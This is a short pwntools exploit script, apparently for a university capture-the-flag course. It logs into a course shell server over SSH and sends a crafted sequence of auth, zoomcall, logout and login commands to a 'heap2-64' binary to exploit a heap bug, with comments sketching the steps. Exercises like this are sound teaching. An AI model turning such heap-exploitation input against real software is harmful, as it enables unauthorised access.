#!/usr/bin/python
from pwn import *

context.clear(arch='amd64', log_level='debug')
context.terminal = 'tmux'

s = ssh('jjcabral', 'cs4401shell2.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/heap2s-64_0_075e76eef90012c47a667f47bfba05f4')
p = s.process(['./heap2-64'])


exploit_str = b"auth AAAAA\nzoomcall AAAAAA\nlogout\nzoomcall AAA\x01\x00\x00\x00\nlogin\n"

p.sendline(exploit_str)

p.recvall()
p.wait()



#First call zoomcall 6
#then call auth blank space
#then call zoomcall med long
#AABBCCD BYTEHEX (DEEF)
#       0x46454544
#then call login